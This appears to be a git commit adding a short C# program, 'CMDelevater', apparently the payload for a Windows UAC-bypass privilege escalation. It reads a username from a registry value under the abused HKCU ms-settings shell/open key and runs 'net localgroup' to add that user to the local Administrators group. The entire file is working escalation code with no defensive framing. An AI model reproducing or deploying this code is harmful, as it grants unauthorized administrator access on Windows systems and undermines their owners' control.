a683e3417959d821de39e65c61b0a7d58536bf86
NBB5 <98120328+NBB5@users.noreply.github.com>
2022-06-03 22:13:01 +0300

    Add files via upload

---
+++ CMDelevater/CMDelevater/Program.cs
@@ -0,0 +1,26 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace CMDelevater
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            RegistryKey currentUserKey = Registry.CurrentUser;
+            RegistryKey key = currentUserKey.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\usertoelevate");
+
+            string user = key.GetValue("usertoelevate").ToString();
+
+            ProcessStartInfo p = new ProcessStartInfo("cmd.exe");
+            p.Arguments = "/k net localgroup Администраторы " + user + " /add ";
+            Process.Start(p);
+        }
+
+    }
+}
